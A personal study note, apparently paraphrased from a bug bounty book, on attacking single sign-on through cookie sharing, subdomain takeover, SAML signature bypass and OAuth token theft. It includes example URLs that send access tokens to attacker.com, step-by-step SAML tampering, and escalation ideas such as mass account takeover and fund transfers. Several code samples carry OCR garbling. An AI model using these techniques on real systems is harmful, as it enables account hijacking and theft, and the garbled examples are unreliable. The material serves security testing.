SSO is a functionality which gives access to users to many services that belong to the same organization without having them to login many times. After logging to the website you can have access to other service or resource belonging to the same brand. If youre logged in on facebook you wont have to provide your credential second time when trying to use instagram. It is widely use, because it makes life easier.

### **Mechanisms**
Sharing cookie files, SAML and OAuth are three widely used ways of implementing SSO. All three of them have unique approach and have their own pros and cons and programmers can choose which mechanism they will use.

#### Cookie Sharing
The implementation of SSO is quite easy if the services that need to share authentication are located under the same parent domain, as is the case with the web and mobile versions of Facebook at www.facebook.com and m.facebook .com. In these situations, applications can share cookies across subdomains.

But how does it work?
Modern web browsers allow sites sharing cookies through subdomains if Domain flag in cookie is set to same super domain. If server sets cookie file in a way shown below this cookie file will be sent to all subdomains of facebook.com
``Set-Cookie: Cookie=abc123; Domain=facebook.com; Secure; HttpOnly

But no all applications can use it this way, because those cookies can't be shared accross domains. Further said this configurations have its own unique vulnerabilities. If attacker can collect one cookie from user he can hijack all accounts on the subdomains. 

#### Subdomains Takeover
The easiest way to put this is that subdomain takeover happens when attacker can take control of unused subdomain of the brand.

Let's imagine a scenario where one company hosts its subdomain on external service like AWS or GitHub Pages. Company can use DNS CNAME record in order to show subdomain other URL address in external website. By doing so, when user will request official subdomain he will get redirected to external website. Organization want to hosts its subdomain abc.example.com on the GitHub abc_example.github.io. Organization can use DNS record CNAME to point abc.example.com to abc_example.github.io so users who want to request abc.example.com get redirected to the hosted service on GitHub.
If the external website will be deleted CNAME record will still redirect user into external subdomain. Unless programmer deletes it ofc. But if the abc_example.github.io wont have an owner everyone could potentially register their account on GitHub and make their own abc_example.github.io Because abc.example.com will still redirect abc_example.github.io.

Domain Takeover lets attacker launch advanced phishing campaign. Users sometimes check if the domain name is correct, but domain takeover lets attacker use proper host name. Attacker that hijacker abc.example.com can host a site that is similar to example.com in order to get users to login with their credentials.

Subdomain takeover can be even more dangerous when organization uses shared cookies. Imagine example.com implements SSO system which is based on shared session. Cookie files will be sent to all subdomains of example.com. Now when attacker takes over abc.example.com he can host there his own malicious script that is sued for stealing cookie files. He can try to convince users to enter abc.example.com by hosting it as a false image or sending link to an user. When victim logged once to SSO of example.com, browser will send cookie file to attackers website. Attackers can steal shared cookie file and login to all services sharing same cookie.

#### SAML
Security Assertion Markup Language is a markup language based on XML. SAML allows SSO functionality by making it easier to exchange information between three sites: user, identity provider and service provider.

##### How does it work?
In SAML systems, the user obtains an identity assertion from the identity provider and uses that to authenticate to the service provider. The identity provider is a server in charge of authenticating the user and passing on user information to the service provider. The service provider is the actual site that the user intends to access.
It looks like this
![[Pasted image 20240318121444.png]]

First you try to gain access to resource from service provider and service provider makes you send SAML request to identity provider. After forwarding credentials identity provider sends you SAML response, which you can use to authenticate to service provider. SAML response contains identity assertion, which forwards your identity to service provider. Those are unique information such as username, email address or user id. 
```
<saml:AttributeStatement>
	<saml:Attribute Name="username"> 
		<saml:AttributeValue>
		user1 
		</saml:AttributeValue> 
	</saml:Attribute>
</saml:AttributeStatement>
```
This is simplistic SAML message theyre much more complicated IRL.

##### SAML Vulnerabilities
SAML wont be safe if attacker can control SAML response that is directed to service provided. Thats why applications have to protect integrity of their SAML, what they achieve by signing signature on their authentication.
SAML can be secure if the SAML signature is implemented correctly. However, its security breaks apart if attackers can find a way to bypass the signature validation and forge the identity assertion to assume the identity of others. For example, if the attacker can change the embedded username in a SAML assertion, they can log in as another user.
The digital signature that most applications apply to SAML messages ensures that no one can tamper with them. If a SAML message has the wrong signature, it won’t be accepted:
```
<saml:Signature> 
	<saml:SignatureValue> 
		dXN1cjE= 
	«/saml:SignatureValue»
«/saml:Signature» 
<saml:AttributeStatement> 
	<saml:Attribute Name="username"> 
		«saml:AttributeValue»
		 user1 
		 </saml:AttributeValue> 
	«/saml:Attribute» 
«/saml:AttributeStatement»
```
SAML signature is often not properly implemented. Sometimes as long as there is something written there server accepts it or it isn't implemented at all or it even verifies the signature only if it exists so attacker can delete this field or empty it. 
Sometimes the mechanism which allows to generate signatures is weak. Sometimes its just encoded login data.
Another common mistake developers make is trusting that encryption alone will provide adequate security for the SAML messages. Encryption protects a message's confidentiality, not its integrity. If a SAML response is encrypted but not signed, or signed with a weak signature, attackers can attempt to tamper with the encrypted message to mess with the outcome of the identity assertion
There are many ways of manipulating hashed messages without having to break encryption.
SAML communicates are also source of disclosing confidential data. If SAML communicate contains confidential data about user password etc. attacker can easily track victims traffic and can try and steal those information's.
Finally, attackers can use SAML as a vector for smuggling malicious input onto the site. For example, if a field in a SAML message is passed into a database, attackers might be able to pollute that field to achieve SOL injection. Depending on how the SAML message is used server-side, attackers might also be able to perform XSS, XXE, and a whole host of other nasty web attacks.

All of the above vulnerabilities happen when there is no proper encryption and signatures implemented. Applications should use hard encryption algorithms and signatures. Furthermore confidential data of users shouldn't be transferred with plain text. Additionally as with every user input it should sanitized and checked for malicious inputs.

#### OAuth
Last way of implementing SSO, which will be described here is OAuth. OAuth is essentially a way for users to grant scope-specific access tokens to service providers through an identity provider. The identity provider manages credentials and user information in a single place, and allows users to log in by supplying service providers with information about the user's identity.

##### How does it work?
When you log in to application with OAuth, service provider access to your information from the identity provider. Those resources may contain your email address, data of birth, contacts and everything else that might be needed to tell your identity. These permissions and fragments of data are called the **scope**. Next identity provider creates unique access-token, which service provider can use to gain access to resources defined by your scope.

Lets take a closer look at that. When you login to service provider by using OAuth protocol, service provider first sends authorization request. This request will include the service provider’s client_id used to identify the service provider, a redirect_uri used to redirect the authentication flow, a scope listing the requested permissions, and a state parameter, which is essentially a CSRF token:
```
identity.com/oauth?
client_id=CLIENT ID
&response type-code
&state=STATE 
&redirect_uri=https://example.com/callback 
&scope=email
```
Then identity provider will ask the user for permission to share data with service provider, normally done by popup.
![[Pasted image 20240318132627.png]]
After the user agrees to the permissions the service provider asks for, the identity provider will send the redirect_uri an authorization code:
``https://example.com/callback?authorization_ code=abc123&state=STATE
Service provider can get access_token from identity provider, by using authorization code with client id and secret. Identifiers and secrets of clients authenticate service provider to the identity provider:
```
identity. com/oauth/token?
client id-CLIENT ID
&client secret-CLIENT SECRET
&redirect uri-https://example.com/callback
&code-abc123
```
The identity provider will send back the access token, which can be used to access the user's information:
``https: //example.com/callback?ttaccess token-xyz123
A service provider might, for instance, initiate a request to the identity provider for an access token to access the user's email. Then it could use the email retrieved from the identity provider as proof of the user's identity to log the user in to the account registered with the same email address.


##### Vulnerabilities in OAuth
Sometimes attackers can steal key tokens of OAuth by using open redirects and by doing so he can bypass OAuth. Attackers do this by manipulating redirect_uri parameter to steal access_token from victims accounts.

Redirect_uri parameter specifies, where identity provider sends key information such as access_token. Because of that main identity provides requires service providers to provide allowed URL addresses which can be used with redirect_uri. 
BUT if in one of the allowed parameters there is open redirect? Most of the times tokens are communicated by using fragment of URL, which is immutable. If attackers can manioulate the flow of OAuth to their own domain, he can steal access_token from this URL fragment and try to gain access to users account.
One way of redirecting the OAuth flow is through a URL-parameterbased open redirect. For example, using the following URL as the redirect_uri:
``redirect_uri=https://example.com/callback?next=attacker.com
will cause the flow to redirect to the callback URL first
``https://example.com/callback?next=attacker.comitaccess_token=xyz123
and then to the attacker's domain:
``https://attacker.comttaccess_token=xyz123
The attacker can send the victim a crafted URL that will initiate the OAuth flow, and then run a listener on their server to harvest the leaked tokens:
```
identity.com/oauth?
client id-CLIENT ID
&response type-code
&state-STATE
&redirect uri-https://example.com/callback?next-attacker.com 
&scope=email
```
Another way of redirecting the OAuth flow is through a referer-based open redirect. In this case, the attacker would have to set up the referer header by initiating the OAuth flow from their domain:
``<a href="https://example.com/login via facebook"»Click here to log in to example.com</a>
This will cause the flow to redirect to the callback URL first:
``https://example.com/callback?itaccess token-xyz123
Then it would redirect to the attacker's domain via the referer:
``https://attacker.comfaccess token-xyz123
Even when attackers can't find an open redirect on the OAuth endpoint itself, they can still smuggle the tokens offsite if they can find an open redirect chain. For example, let's say the redirect uri parameter permits only further redirects to URLs that are under the example.com domain. If attackers can find an open redirect within that domain, they can still steal OAuth tokens via redirects. Let’s say an unfixed open redirect is on the logout endpoint of example.com:
``https://example.com/logout ?next=attacker.com
By taking advantage of this open redirect, the attacker can form a chain of redirects to eventually smuggle the token offsite, starting with the following:
``redirect uri-https://example.com/callback?next-example.com/logout?next-attacker.com
This redirect uri will first cause the flow to redirect to the callback URL:
``https: //example.com/callback?next-example.com/logout?next-attacker.comitaccess token-xyz123
Then to the logout URL vulnerable to open redirect:
``https: //example.com/logout?next-attacker.comitaccess token-xyz123
Then it will redirect to the attacker's domain. The attacker can harvest the access token via their server logs, and access the user's resources via the stolen token:
``https://attacker.comitaccess token-xyz123
Besides stealing access tokens via an open redirect, long-lived tokens that don't expire are also a major OAuth vulnerability. Sometimes tokens aren't invalidated periodically and can be used by attackers long after they are stolen, and remain valid even after password reset. You can test for these issues by using the same access tokens after logout and after password reset.

### **How to look for: Subdomains Takeover**
The best thing would be to create tool that would automatically track subdomains that could potentially be hijacked.

##### Step One
First you have to create list of all known subdomains of your target. Next use applications that make screenshots like EyeWitness or Snapper to see what is hosted on all subdomains

##### Step Two
Look for third-party pages indicating that the page isn’t registered. For example, if the third-party page is hosted on GitHub Pages, you should see something like:
![[Pasted image 20240318140254.png]]
Even if you’ve found a dangling CNAME, not all third-party hosting providers are vulnerable to takeovers. Some providers employ measures to verify the identity of users, to prevent people from registering pages associated with CNAME records. Currently, pages hosted on AWS, Bitbucket, and GitHub are vulnerable, whereas pages on Squarespace and Google Cloud are not. You can find a full list of which third-party sites are vulnerable on EdOverflow’s page on the topic (https://github.com/EdOverflow/can-i-take-over-xyz/). You can find a list of page signatures that indicate an unregistered page there too. 

##### Step three
Once you’ve determined that the page is vulnerable to takeovers, you should try to register it on the third-party site to confirm the vulnerability. To register a page, go to the third-party site and claim the page as yours; the actual steps required vary by third-party provider.

Make sure to keep the site registered until the company mitigates the vulnerability by either removing the dangling DNS CNAME or by reclaiming the page on the third-party service. If you don’t, a malicious attacker might be able to take over the subdomain while the bug report is being processed.

You might be able to steal cookies with the subdomain takeover if the site uses cookie-sharing SSO. Look for cookies that can be sent to multiple subdomains in the server’s responses. Shared cookies are sent with the Domain attribute specifying the parents of subdomains that can access the cookie
``Set-Cookie: cookie=abc123; Domain=example.com; Secure; HttpOnly
Then, you can log in to the legitimate site, and visit your site in the same browser. You can monitor the logs of your newly registered site to determine whether your cookies were sent to it. If the logs of your newly registered site receive your cookies, you have found a subdomain takeover that can be used to steal cookies! Even if the subdomain takeover you've found cannot be used to steal shared-session cookies, it is still considered a vulnerability. Subdomain takeovers can be used to launch phishing attacks on a site's users, so you should still report them to the organization!

##### Automating this process
You should have automation for this process working at all times. We never know when website will be deleted or in resources of target there will be new CNAME record.
To create system of permanent monitoring you should try and create tool for that:

###### Compile a list of subdomains that belong to the target organization
Scan the target for new subdomains once in a while to monitor for new subdomains. Whenever you discover a new service, add it to this list of monitored subdomains.

###### Scan for subdomains on the list with CNAME entries that point to pages hosted on a vulnerable third-party service 
To do this, you'll need to resolve the base DNS domain of the subdomain and determine if it's hosted on a third-party provider based on keywords in the URL. For example, a subdomain that points to a URL that contains the string github.iois hosted on GitHub Pages. Also determine whether the third-party services you've found are vulnerable to takeovers. If the target's sites are exclusively hosted on services that aren't vulnerable to subdomain takeovers, you don't have to scan them for potential takeovers.

###### Determine the signature of an unregistered page for each external service
Most services will have a custom 404 Not Found page that indicates the page isn't registered. You can use these pages to detect a potential takeover. For example, a page that is hosted on GitHub pages is vulnerable if the string There isn't a GitHub Pages site here is returned in the HTTP response. Make a request to the third-party hosted subdomains and scan the response for these signature strings. If one of the signatures is detected, the page might be vulnerable to takeover.

One way of making this hunting process even more efficient is to let your automation solution run in the background, notifying you only after it finds a suspected takeover. You can set up a cron job to run the script for you:
``30 10 * * * cd /Users/vickie/scripts/security; ./subdomains_takeover.sh

### **Looking for SAML vulnerabilities**
First you have to be sure that website uses SAML. To be sure capture traffic on the website and look for something like XML or keywords like saml. Remember that they can be encoded or even encrypted.

##### Step One
First and foremost, you need to locate the SAML response. You can usually do this by intercepting the requests going between the browser and the service provider using a proxy. The SAML response will be sent when the user's browser is logging into a new session for that particular service provider.


##### Step Two
Once you've located the SAML response, you can analyze its content to see which fields the service provider uses for determining the identity of the user. Since the SAML response is used to relay authentication data to the service provider, it must contain fields that communicate that information. For example, look for field names like username, email address, userID, and so on. Try tampering with these fields in your proxy. If the SAML message lacks a signature, or if the signature of the SAML response isn't verified at all, tampering with the message is all you need to do to authenticate as someone else!

##### Optional Step Three
If the SAML message you're tampering with does have a signature, you can try a few strategies to bypass it.
If the signatures are verified only when they exist, you could try removing the signature value from the SAML response. Sometimes this is the only action required to bypass security checks. You can do this in two ways. 
You can either empty signature field, or remove signature tags completely.

##### Step Four
After tampering with the SAML response, re-encode the message into its original form and send it back to the service provider. The service provider will use that information to authenticate you to the service. If you're successful, you can obtain a valid session that belongs to the victim's account. SAML Raider is a Burp Suite extension that can help you with editing and re-encoding SAML messages.


### **Hunting for OAuth Token Theft**
Before you dive into hunting for OAuth open redirect issues, you should first determine whether the website is using OAuth. You can figure this out by intercepting the requests to complete authentication on the website and look for the oauth keyword in the HTTP messages.

Then start looking for open redirect vulnerabilities. You can find details on how to find open redirects in [[Open Redirect]].

### **Escalation**
SSO bypass usually means that attackers can take over the accounts of others. Therefore, these vulnerabilities are of high severity before any escalation attempts. But you can escalate SSO bypass vulnerabilities by attempting to take over accounts with high privileges, such as admin accounts.

Also, after you’ve taken over the user’s account on one site, you can try to access the victim’s account on other sites by using the same OAuth credentials. For instance, if you can leak an employee’s cookies via subdomain takeover, see if you can access their company’s internal services such as admin panels, business intelligence systems, and HR applications with the same credentials.

You can also escalate account takeovers by writing a script to automate the takeover of large numbers of accounts. Finally, you can try to leak data, execute sensitive actions, or take over the application by using the accounts that you have taken over. For example, if you can bypass the SSO on a banking site, can you read private information or transfer funds illegally? If you can take over an admin account, can you change application settings or execute scripts as the admin? \




























